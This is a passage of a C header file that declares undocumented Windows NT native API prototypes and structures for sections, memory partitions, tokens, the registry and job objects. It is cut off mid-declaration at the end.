typedef struct _MEMORY_PARTITION_PAGE_COMBINE_INFORMATION {
    PVOID StopHandle;
    ULONG Flags;
    ULONG_PTR TotalNumberOfPages;
} MEMORY_PARTITION_PAGE_COMBINE_INFORMATION, *PMEMORY_PARTITION_PAGE_COMBINE_INFORMATION;

typedef struct _MEMORY_PARTITION_PAGEFILE_INFORMATION {
    UNICODE_STRING PageFileName;
    LARGE_INTEGER MinimumSize;
    LARGE_INTEGER MaximumSize;
    ULONG Flags;
} MEMORY_PARTITION_PAGEFILE_INFORMATION, *PMEMORY_PARTITION_PAGEFILE_INFORMATION;

typedef struct _MEMORY_PARTITION_TRANSFER_INFORMATION {
    ULONG_PTR NumberOfPages;
    ULONG NumaNode;
    ULONG Flags;
} MEMORY_PARTITION_TRANSFER_INFORMATION, *PMEMORY_PARTITION_TRANSFER_INFORMATION;

typedef struct _MEMORY_PARTITION_CONFIGURATION_INFORMATION {
    ULONG Flags;
    ULONG NumaNode;
    ULONG Channel;
    ULONG NumberOfNumaNodes;
    ULONG_PTR ResidentAvailablePages;
    ULONG_PTR CommittedPages;
    ULONG_PTR CommitLimit;
    ULONG_PTR PeakCommitment;
    ULONG_PTR TotalNumberOfPages;
    ULONG_PTR AvailablePages;
    ULONG_PTR ZeroPages;
    ULONG_PTR FreePages;
    ULONG_PTR StandbyPages;

    // Fields added RS1+
    ULONG_PTR StandbyPageCountByPriority[8];
    ULONG_PTR RepurposedPagesByPriority[8];
    ULONG_PTR MaximumCommitLimit;
    ULONG_PTR DonatedPagesToPartitions;
    ULONG PartitionId;
} MEMORY_PARTITION_CONFIGURATION_INFORMATION, * PMEMORY_PARTITION_CONFIGURATION_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI
NtCreateSection(
    _Out_ PHANDLE SectionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PLARGE_INTEGER MaximumSize,
    _In_ ULONG SectionPageProtection,
    _In_ ULONG AllocationAttributes,
    _In_opt_ HANDLE FileHandle);

//taken from ph2
NTSYSAPI
NTSTATUS
NTAPI
NtCreateSectionEx(
    _Out_ PHANDLE SectionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PLARGE_INTEGER MaximumSize,
    _In_ ULONG SectionPageProtection,
    _In_ ULONG AllocationAttributes,
    _In_opt_ HANDLE FileHandle,
    _Inout_updates_opt_(ExtendedParameterCount) PMEM_EXTENDED_PARAMETER ExtendedParameters,
    _In_ ULONG ExtendedParameterCount);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenSection(
    _Out_ PHANDLE SectionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtMapViewOfSection(
    _In_ HANDLE SectionHandle,
    _In_ HANDLE ProcessHandle,
    _Inout_ _At_(*BaseAddress, _Readable_bytes_(*ViewSize) _Writable_bytes_(*ViewSize) _Post_readable_byte_size_(*ViewSize)) PVOID *BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _In_ SIZE_T CommitSize,
    _Inout_opt_ PLARGE_INTEGER SectionOffset,
    _Inout_ PSIZE_T ViewSize,
    _In_ SECTION_INHERIT InheritDisposition,
    _In_ ULONG AllocationType,
    _In_ ULONG Win32Protect);

//taken from ph2
NTSYSAPI
NTSTATUS
NTAPI
NtMapViewOfSectionEx(
    _In_ HANDLE SectionHandle,
    _In_ HANDLE ProcessHandle,
    _Inout_ _At_(*BaseAddress, _Readable_bytes_(*ViewSize) _Writable_bytes_(*ViewSize) _Post_readable_byte_size_(*ViewSize)) PVOID* BaseAddress,
    _Inout_opt_ PLARGE_INTEGER SectionOffset,
    _Inout_ PSIZE_T ViewSize,
    _In_ ULONG AllocationType,
    _In_ ULONG Win32Protect,
    _Inout_updates_opt_(ParameterCount) PMEM_EXTENDED_PARAMETER ExtendedParameters,
    _In_ ULONG ExtendedParameterCount);

NTSYSAPI
NTSTATUS
NTAPI
NtUnmapViewOfSection(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress);

NTSYSAPI
NTSTATUS
NTAPI
NtUnmapViewOfSectionEx(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_ ULONG Flags);

NTSYSAPI
NTSTATUS
NTAPI
NtQuerySection(
    _In_ HANDLE SectionHandle,
    _In_ SECTION_INFORMATION_CLASS SectionInformationClass,
    _Out_writes_bytes_(SectionInformationLength) PVOID SectionInformation,
    _In_ SIZE_T SectionInformationLength,
    _Out_opt_ PSIZE_T ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtExtendSection(
    _In_ HANDLE SectionHandle,
    _Inout_ PLARGE_INTEGER NewSectionSize);

NTSYSAPI
NTSTATUS
NTAPI
NtMapUserPhysicalPages(
    _In_ PVOID VirtualAddress,
    _In_ ULONG_PTR NumberOfPages,
    _In_reads_opt_(NumberOfPages) PULONG_PTR UserPfnArray);

NTSYSAPI
NTSTATUS
NTAPI
NtMapUserPhysicalPagesScatter(
    _In_reads_(NumberOfPages) PVOID *VirtualAddresses,
    _In_ ULONG_PTR NumberOfPages,
    _In_reads_opt_(NumberOfPages) PULONG_PTR UserPfnArray);

NTSYSAPI
NTSTATUS
NTAPI
NtAllocateUserPhysicalPages(
    _In_ HANDLE ProcessHandle,
    _Inout_ PULONG_PTR NumberOfPages,
    _Out_writes_(*NumberOfPages) PULONG_PTR UserPfnArray);

NTSYSAPI
NTSTATUS
NTAPI
NtFreeUserPhysicalPages(
    _In_ HANDLE ProcessHandle,
    _Inout_ PULONG_PTR NumberOfPages,
    _In_reads_(*NumberOfPages) PULONG_PTR UserPfnArray);

NTSYSAPI
NTSTATUS
NTAPI
NtAreMappedFilesTheSame(
    _In_ PVOID File1MappedAsAnImage,
    _In_ PVOID File2MappedAsFile);

//
// NtCreatePartition
//

//
// 10248
//
typedef NTSTATUS(NTAPI* pfnNtCreatePartitionV1)(
    _Out_ PHANDLE PartitionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ ULONG PreferredNode);

//
// 10586
//
typedef NTSTATUS(NTAPI* pfnNtCreatePartitionV2)(
    _In_ HANDLE ParentPartitionHandle,
    _Out_ HANDLE* PartitionHandle,
    _In_ ULONG DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ ULONG Node);

//
// Actual NtCreatePartition definition since Win10 10586
//
NTSYSAPI
NTSTATUS
NTAPI
NtCreatePartition(
    _In_ HANDLE ParentPartitionHandle,
    _Out_ HANDLE* PartitionHandle,
    _In_ ULONG DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ ULONG Node);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenPartition(
    _Out_ PHANDLE PartitionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtManagePartition(
    _In_ HANDLE TargetHandle,
    _In_opt_ HANDLE SourceHandle,
    _In_ MEMORY_PARTITION_INFORMATION_CLASS PartitionInformationClass,
    _Inout_updates_bytes_(PartitionInformationLength) PVOID PartitionInformation,
    _In_ ULONG PartitionInformationLength);

/************************************************************************************
*
* Token API.
*
************************************************************************************/
//
// This part is taken from PH ntseapi.h.
//

// Types

#define TOKEN_SECURITY_ATTRIBUTE_TYPE_INVALID 0x00
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_INT64 0x01
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_UINT64 0x02
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_STRING 0x03
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_FQBN 0x04
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_SID 0x05
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_BOOLEAN 0x06
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_OCTET_STRING 0x10

// Flags

#define TOKEN_SECURITY_ATTRIBUTE_NON_INHERITABLE 0x0001
#define TOKEN_SECURITY_ATTRIBUTE_VALUE_CASE_SENSITIVE 0x0002
#define TOKEN_SECURITY_ATTRIBUTE_USE_FOR_DENY_ONLY 0x0004
#define TOKEN_SECURITY_ATTRIBUTE_DISABLED_BY_DEFAULT 0x0008
#define TOKEN_SECURITY_ATTRIBUTE_DISABLED 0x0010
#define TOKEN_SECURITY_ATTRIBUTE_MANDATORY 0x0020
#define TOKEN_SECURITY_ATTRIBUTE_COMPARE_IGNORE 0x0040

#define TOKEN_SECURITY_ATTRIBUTE_VALID_FLAGS ( \
    TOKEN_SECURITY_ATTRIBUTE_NON_INHERITABLE | \
    TOKEN_SECURITY_ATTRIBUTE_VALUE_CASE_SENSITIVE | \
    TOKEN_SECURITY_ATTRIBUTE_USE_FOR_DENY_ONLY | \
    TOKEN_SECURITY_ATTRIBUTE_DISABLED_BY_DEFAULT | \
    TOKEN_SECURITY_ATTRIBUTE_DISABLED | \
    TOKEN_SECURITY_ATTRIBUTE_MANDATORY)

#define TOKEN_SECURITY_ATTRIBUTE_CUSTOM_FLAGS 0xffff0000

typedef struct _TOKEN_SECURITY_ATTRIBUTE_FQBN_VALUE
{
    ULONG64 Version;
    UNICODE_STRING Name;
} TOKEN_SECURITY_ATTRIBUTE_FQBN_VALUE, *PTOKEN_SECURITY_ATTRIBUTE_FQBN_VALUE;

typedef struct _TOKEN_SECURITY_ATTRIBUTE_OCTET_STRING_VALUE
{
    PVOID pValue;
    ULONG ValueLength;
} TOKEN_SECURITY_ATTRIBUTE_OCTET_STRING_VALUE, *PTOKEN_SECURITY_ATTRIBUTE_OCTET_STRING_VALUE;

typedef struct _TOKEN_SECURITY_ATTRIBUTE_V1
{
    UNICODE_STRING Name;
    USHORT ValueType;
    USHORT Reserved;
    ULONG Flags;
    ULONG ValueCount;
    union
    {
        PLONG64 pInt64;
        PULONG64 pUint64;
        PUNICODE_STRING pString;
        PTOKEN_SECURITY_ATTRIBUTE_FQBN_VALUE pFqbn;
        PTOKEN_SECURITY_ATTRIBUTE_OCTET_STRING_VALUE pOctetString;
    } Values;
} TOKEN_SECURITY_ATTRIBUTE_V1, *PTOKEN_SECURITY_ATTRIBUTE_V1;

#define TOKEN_SECURITY_ATTRIBUTES_INFORMATION_VERSION_V1 1
#define TOKEN_SECURITY_ATTRIBUTES_INFORMATION_VERSION TOKEN_SECURITY_ATTRIBUTES_INFORMATION_VERSION_V1

typedef struct _TOKEN_SECURITY_ATTRIBUTES_INFORMATION
{
    USHORT Version;
    USHORT Reserved;
    ULONG AttributeCount;
    union
    {
        PTOKEN_SECURITY_ATTRIBUTE_V1 pAttributeV1;
    } Attribute;
} TOKEN_SECURITY_ATTRIBUTES_INFORMATION, *PTOKEN_SECURITY_ATTRIBUTES_INFORMATION;

//
// endof ntseapi.h
//

NTSYSAPI
NTSTATUS
NTAPI
NtAccessCheck(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _In_ HANDLE ClientToken,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ PGENERIC_MAPPING GenericMapping,
    _Out_writes_bytes_(*PrivilegeSetLength) PPRIVILEGE_SET PrivilegeSet,
    _Inout_ PULONG PrivilegeSetLength,
    _Out_ PACCESS_MASK GrantedAccess,
    _Out_ PNTSTATUS AccessStatus);

NTSYSAPI
NTSTATUS
NTAPI
NtAccessCheckByType(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _In_opt_ PSID PrincipalSelfSid,
    _In_ HANDLE ClientToken,
    _In_ ACCESS_MASK DesiredAccess,
    _In_reads_(ObjectTypeListLength) POBJECT_TYPE_LIST ObjectTypeList,
    _In_ ULONG ObjectTypeListLength,
    _In_ PGENERIC_MAPPING GenericMapping,
    _Out_writes_bytes_(*PrivilegeSetLength) PPRIVILEGE_SET PrivilegeSet,
    _Inout_ PULONG PrivilegeSetLength,
    _Out_ PACCESS_MASK GrantedAccess,
    _Out_ PNTSTATUS AccessStatus);

NTSYSAPI
NTSTATUS
NTAPI
NtAccessCheckByTypeResultList(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _In_opt_ PSID PrincipalSelfSid,
    _In_ HANDLE ClientToken,
    _In_ ACCESS_MASK DesiredAccess,
    _In_reads_(ObjectTypeListLength) POBJECT_TYPE_LIST ObjectTypeList,
    _In_ ULONG ObjectTypeListLength,
    _In_ PGENERIC_MAPPING GenericMapping,
    _Out_writes_bytes_(*PrivilegeSetLength) PPRIVILEGE_SET PrivilegeSet,
    _Inout_ PULONG PrivilegeSetLength,
    _Out_writes_(ObjectTypeListLength) PACCESS_MASK GrantedAccess,
    _Out_writes_(ObjectTypeListLength) PNTSTATUS AccessStatus);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenObjectAuditAlarm(
    _In_ PUNICODE_STRING SubsystemName,
    _In_opt_ PVOID HandleId,
    _In_ PUNICODE_STRING ObjectTypeName,
    _In_ PUNICODE_STRING ObjectName,
    _In_opt_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _In_ HANDLE ClientToken,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ACCESS_MASK GrantedAccess,
    _In_opt_ PPRIVILEGE_SET Privileges,
    _In_ BOOLEAN ObjectCreation,
    _In_ BOOLEAN AccessGranted,
    _Out_ PBOOLEAN GenerateOnClose);

NTSYSAPI
NTSTATUS
NTAPI
NtCloseObjectAuditAlarm(
    _In_ PUNICODE_STRING SubsystemName,
    _In_opt_ PVOID HandleId,
    _In_ BOOLEAN GenerateOnClose);

NTSYSAPI
NTSTATUS
NTAPI
NtDeleteObjectAuditAlarm(
    _In_ PUNICODE_STRING SubsystemName,
    _In_opt_ PVOID HandleId,
    _In_ BOOLEAN GenerateOnClose);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenProcessToken(
    _In_ HANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE TokenHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenProcessTokenEx(
    _In_ HANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ULONG HandleAttributes,
    _Out_ PHANDLE TokenHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtDuplicateToken(
    _In_ HANDLE ExistingTokenHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ BOOLEAN EffectiveOnly,
    _In_ TOKEN_TYPE TokenType,
    _Out_ PHANDLE NewTokenHandle);

#ifndef DISABLE_MAX_PRIVILEGE
#define DISABLE_MAX_PRIVILEGE   0x1 // winnt
#endif

#ifndef SANDBOX_INERT
#define SANDBOX_INERT           0x2 // winnt
#endif

#ifndef LUA_TOKEN
#define LUA_TOKEN               0x4 // winnt
#endif

#ifndef WRITE_RESTRICTED
#define WRITE_RESTRICTED        0x8 // winnt
#endif

NTSYSAPI
NTSTATUS
NTAPI
NtFilterToken(
    _In_ HANDLE ExistingTokenHandle,
    _In_ ULONG Flags,
    _In_opt_ PTOKEN_GROUPS SidsToDisable,
    _In_opt_ PTOKEN_PRIVILEGES PrivilegesToDelete,
    _In_opt_ PTOKEN_GROUPS RestrictedSids,
    _Out_ PHANDLE NewTokenHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtImpersonateAnonymousToken(
    _In_ HANDLE ThreadHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryInformationToken(
    _In_ HANDLE TokenHandle,
    _In_ TOKEN_INFORMATION_CLASS TokenInformationClass,
    _Out_writes_bytes_to_opt_(TokenInformationLength, *ReturnLength) PVOID TokenInformation,
    _In_ ULONG TokenInformationLength,
    _Out_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationToken(
    _In_ HANDLE TokenHandle,
    _In_ TOKEN_INFORMATION_CLASS TokenInformationClass,
    _In_reads_bytes_(TokenInformationLength) PVOID TokenInformation,
    _In_ ULONG TokenInformationLength);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenThreadToken(
    _In_ HANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ BOOLEAN OpenAsSelf,
    _Out_ PHANDLE TokenHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenThreadTokenEx(
    _In_ HANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ BOOLEAN OpenAsSelf,
    _In_ ULONG HandleAttributes,
    _Out_ PHANDLE TokenHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtAdjustPrivilegesToken(
    _In_ HANDLE TokenHandle,
    _In_ BOOLEAN DisableAllPrivileges,
    _In_opt_ PTOKEN_PRIVILEGES NewState,
    _In_ ULONG BufferLength,
    _Out_writes_bytes_to_opt_(BufferLength, *ReturnLength) PTOKEN_PRIVILEGES PreviousState,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtAdjustGroupsToken(
    _In_ HANDLE TokenHandle,
    _In_ BOOLEAN ResetToDefault,
    _In_opt_ PTOKEN_GROUPS NewState,
    _In_opt_ ULONG BufferLength,
    _Out_writes_bytes_to_opt_(BufferLength, *ReturnLength) PTOKEN_GROUPS PreviousState,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtCompareTokens(
    _In_ HANDLE FirstTokenHandle,
    _In_ HANDLE SecondTokenHandle,
    _Out_ PBOOLEAN Equal);

NTSYSAPI
NTSTATUS
NTAPI
NtPrivilegeCheck(
    _In_ HANDLE ClientToken,
    _Inout_ PPRIVILEGE_SET RequiredPrivileges,
    _Out_ PBOOLEAN Result);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateToken(
    _Out_ PHANDLE TokenHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ TOKEN_TYPE TokenType,
    _In_ PLUID AuthenticationId,
    _In_ PLARGE_INTEGER ExpirationTime,
    _In_ PTOKEN_USER User,
    _In_ PTOKEN_GROUPS Groups,
    _In_ PTOKEN_PRIVILEGES Privileges,
    _In_opt_ PTOKEN_OWNER Owner,
    _In_ PTOKEN_PRIMARY_GROUP PrimaryGroup,
    _In_opt_ PTOKEN_DEFAULT_DACL DefaultDacl,
    _In_ PTOKEN_SOURCE TokenSource);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateTokenEx(
    _Out_ PHANDLE TokenHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ TOKEN_TYPE TokenType,
    _In_ PLUID AuthenticationId,
    _In_ PLARGE_INTEGER ExpirationTime,
    _In_ PTOKEN_USER User,
    _In_ PTOKEN_GROUPS Groups,
    _In_ PTOKEN_PRIVILEGES Privileges,
    _In_opt_ PVOID UserAttributes, // points to TOKEN_SECURITY_ATTRIBUTES_INFORMATION
    _In_opt_ PVOID DeviceAttributes, // points to PTOKEN_SECURITY_ATTRIBUTES_INFORMATION
    _In_opt_ PTOKEN_GROUPS DeviceGroups,
    _In_opt_ PTOKEN_MANDATORY_POLICY TokenMandatoryPolicy,
    _In_opt_ PTOKEN_OWNER Owner,
    _In_ PTOKEN_PRIMARY_GROUP PrimaryGroup,
    _In_opt_ PTOKEN_DEFAULT_DACL DefaultDacl,
    _In_ PTOKEN_SOURCE TokenSource);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateLowBoxToken(
    _Out_ PHANDLE TokenHandle,
    _In_ HANDLE ExistingTokenHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ PSID PackageSid,
    _In_ ULONG CapabilityCount,
    _In_reads_opt_(CapabilityCount) PSID_AND_ATTRIBUTES Capabilities,
    _In_ ULONG HandleCount,
    _In_reads_opt_(HandleCount) HANDLE *Handles);

/************************************************************************************
*
* Registry API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtCreateKey(
    _Out_ PHANDLE KeyHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Reserved_ ULONG TitleIndex,
    _In_opt_ PUNICODE_STRING Class,
    _In_ ULONG CreateOptions,
    _Out_opt_ PULONG Disposition);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateKeyTransacted(
    _Out_ PHANDLE KeyHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Reserved_ ULONG TitleIndex,
    _In_opt_ PUNICODE_STRING Class,
    _In_ ULONG CreateOptions,
    _In_ HANDLE TransactionHandle,
    _Out_opt_ PULONG Disposition);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenKey(
    _Out_ PHANDLE KeyHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenKeyEx(
    _Out_ PHANDLE KeyHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ ULONG OpenOptions);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenKeyTransacted(
    _Out_ PHANDLE KeyHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE TransactionHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenKeyTransactedEx(
    _Out_ PHANDLE KeyHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ ULONG OpenOptions,
    _In_ HANDLE TransactionHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryKey(
    _In_ HANDLE KeyHandle,
    _In_ KEY_INFORMATION_CLASS KeyInformationClass,
    _Out_writes_bytes_opt_(Length) PVOID KeyInformation,
    _In_ ULONG Length,
    _Out_ PULONG ResultLength);

NTSYSAPI
NTSTATUS
NTAPI
NtEnumerateKey(
    _In_ HANDLE KeyHandle,
    _In_ ULONG Index,
    _In_ KEY_INFORMATION_CLASS KeyInformationClass,
    _Out_writes_bytes_opt_(Length) PVOID KeyInformation,
    _In_ ULONG Length,
    _Out_ PULONG ResultLength);

NTSYSAPI
NTSTATUS
NTAPI
NtEnumerateValueKey(
    _In_ HANDLE KeyHandle,
    _In_ ULONG Index,
    _In_ KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    _Out_writes_bytes_opt_(Length) PVOID KeyValueInformation,
    _In_ ULONG Length,
    _Out_ PULONG ResultLength);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryValueKey(
    _In_ HANDLE KeyHandle,
    _In_ PUNICODE_STRING ValueName,
    _In_ KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    _Out_writes_bytes_opt_(Length) PVOID KeyValueInformation,
    _In_ ULONG Length,
    _Out_ PULONG ResultLength);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryMultipleValueKey(
    _In_ HANDLE KeyHandle,
    _Inout_updates_(EntryCount) PKEY_VALUE_ENTRY ValueEntries,
    _In_ ULONG EntryCount,
    _Out_writes_bytes_(*BufferLength) PVOID ValueBuffer,
    _Inout_ PULONG BufferLength,
    _Out_opt_ PULONG RequiredBufferLength);

NTSYSAPI
NTSTATUS
NTAPI
NtSetValueKey(
    _In_ HANDLE KeyHandle,
    _In_ PUNICODE_STRING ValueName,
    _In_ ULONG TitleIndex,
    _In_ ULONG Type,
    _In_reads_bytes_opt_(DataSize) PVOID Data,
    _In_ ULONG DataSize);

NTSYSAPI
NTSTATUS
NTAPI
NtDeleteKey(
    _In_ HANDLE KeyHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtDeleteValueKey(
    _In_ HANDLE KeyHandle,
    _In_ PUNICODE_STRING ValueName);

NTSYSAPI
NTSTATUS
NTAPI
NtRenameKey(
    _In_ HANDLE KeyHandle,
    _In_ PUNICODE_STRING NewName);

NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationKey(
    _In_ HANDLE KeyHandle,
    _In_ KEY_SET_INFORMATION_CLASS KeySetInformationClass,
    _In_reads_bytes_(KeySetInformationLength) PVOID KeySetInformation,
    _In_ ULONG KeySetInformationLength);

NTSYSAPI
NTSTATUS
NTAPI
NtFlushKey(
    _In_ HANDLE KeyHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtCompressKey(
    _In_ HANDLE Key);

NTSYSAPI
NTSTATUS
NTAPI
NtLoadKey(
    _In_ POBJECT_ATTRIBUTES TargetKey,
    _In_ POBJECT_ATTRIBUTES SourceFile);

NTSYSAPI
NTSTATUS
NTAPI
NtLoadKey2(
    _In_ POBJECT_ATTRIBUTES TargetKey,
    _In_ POBJECT_ATTRIBUTES SourceFile,
    _In_ ULONG Flags);

//https://gist.github.com/tyranid/1db47869da253a912242c694e921009d#file-ntloadkeyex3-h

typedef enum _KEY_LOAD_HANDLE_TYPE {
    KeyLoadTrustKey = 1,
    KeyLoadEvent,
    KeyLoadToken
} KEY_LOAD_HANDLE_TYPE;

typedef struct _KEY_LOAD_HANDLE {
    KEY_LOAD_HANDLE_TYPE Type;
    HANDLE Handle;
} KEY_LOAD_HANDLE, *PKEY_LOAD_HANDLE;

NTSYSAPI
NTSTATUS
NTAPI
NtLoadKey3(
    _In_ POBJECT_ATTRIBUTES TargetKey,
    _In_ POBJECT_ATTRIBUTES SourceFile,
    _In_ ULONG Flags,
    _In_ PKEY_LOAD_HANDLE LoadEntries,
    _In_ ULONG LoadEntryCount,
    _In_opt_ ACCESS_MASK DesiredAccess,
    _Out_opt_ PHANDLE RootHandle,
    _In_ PVOID Unused);

NTSYSAPI
NTSTATUS
NTAPI
NtLoadKeyEx(
    _In_ POBJECT_ATTRIBUTES TargetKey,
    _In_ POBJECT_ATTRIBUTES SourceFile,
    _In_ ULONG Flags,
    _In_opt_ HANDLE TrustClassKey,
    _In_opt_ HANDLE Event,
    _In_opt_ ACCESS_MASK DesiredAccess,
    _Out_opt_ PHANDLE RootHandle,
    _Out_opt_ PIO_STATUS_BLOCK IoStatus);

NTSYSAPI
NTSTATUS
NTAPI
NtSaveKey(
    _In_ HANDLE KeyHandle,
    _In_ HANDLE FileHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtSaveKeyEx(
    _In_ HANDLE KeyHandle,
    _In_ HANDLE FileHandle,
    _In_ ULONG Format);

NTSYSAPI
NTSTATUS
NTAPI
NtUnloadKey(
    _In_ POBJECT_ATTRIBUTES TargetKey);

NTSYSAPI
NTSTATUS
NTAPI
NtUnloadKey2(
    _In_ POBJECT_ATTRIBUTES TargetKey,
    _In_ ULONG Flags);

NTSYSAPI
NTSTATUS
NTAPI
NtUnloadKeyEx(
    _In_ POBJECT_ATTRIBUTES TargetKey,
    _In_opt_ HANDLE Event);

NTSYSAPI
NTSTATUS
NTAPI
NtNotifyChangeKey(
    _In_ HANDLE KeyHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG CompletionFilter,
    _In_ BOOLEAN WatchTree,
    _Out_writes_bytes_opt_(BufferSize) PVOID Buffer,
    _In_ ULONG BufferSize,
    _In_ BOOLEAN Asynchronous);

NTSYSAPI
NTSTATUS
NTAPI
NtLockRegistryKey(
    _In_ HANDLE KeyHandle);

NTSYSAPI
NTSTATUS
NTAPI 
NtCreateRegistryTransaction(
    _Out_ PHANDLE Handle,
    _In_ ACCESS_MASK DesiredAccess, //generic + TRANSACTION_*
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ DWORD Flags);

NTSYSAPI
NTSTATUS
NTAPI 
NtCommitRegistryTransaction(
    _In_ HANDLE RegistryHandle,
    _In_ BOOL Wait);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenRegistryTransaction(
    _Out_ PHANDLE RegistryHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI 
NtRollbackRegistryTransaction(
    _In_ HANDLE RegistryHandle,
    _In_ BOOL Wait);


/************************************************************************************
*
* Job API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtAssignProcessToJobObject(
    _In_ HANDLE JobHandle,
    _In_ HANDLE ProcessHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateJobObject(
    _Out_ PHANDLE JobHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateJobSet(
    _In_ ULONG NumJob,
    _In_reads_(NumJob) PJOB_SET_ARRAY UserJobSet,
    _In_ ULONG Flags);

NTSYSAPI
NTSTATUS
NTAPI
NtIsProcessInJob(
    _In_ HANDLE ProcessHandle,
    _In_opt_ HANDLE JobHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenJobObject(
    _Out_ PHANDLE JobHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryInformationJobObject(
    _In_opt_ HANDLE JobHandle,
    _In_ JOBOBJECTINFOCLASS JobObjectInformationClass,
